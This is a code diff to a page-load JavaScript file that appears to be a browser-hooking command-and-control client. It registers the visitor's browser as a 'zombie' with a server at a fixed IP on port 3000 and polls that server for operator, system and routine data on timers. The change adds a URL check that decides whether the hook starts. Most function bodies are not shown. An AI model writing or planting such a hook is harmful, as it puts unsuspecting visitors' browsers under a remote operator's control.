@@ -7,6 +7,7 @@ document.addEventListener("DOMContentLoaded", function(event) {
 
 var serveur = "10.34.2.139";
 var zombie  = "";
+var current_location = window.location.href;
 
   function Sendzombie(){
     $.get('http://'+serveur+':3000/login_zombie', function(data){
@@ -44,10 +45,19 @@ var zombie  = "";
       console.log('online');
     })
   }
-
-  setTimeout(Sendzombie,500);
-  setTimeout(GetOperator, 1500);
-  setTimeout(GetSystem, 1500);
-  setInterval(GetRoutine, 2500);
-  setInterval(SetOnline, 3000);
+  var check_url = current_location.split('.');
+  if(current_location.indexOf('/') > -1){
+    check_url = current_location.split('/')[0];
+    check_url = check_url.split('.');
+  }
+  if(check_url.length < 3){
+    setTimeout(Sendzombie,500);
+    setTimeout(GetOperator, 1500);
+    setTimeout(GetSystem, 1500);
+    setInterval(GetRoutine, 2500);
+    setInterval(SetOnline, 3000);
+  }
+  else{
+    console.log(check_url);
+  }
 });
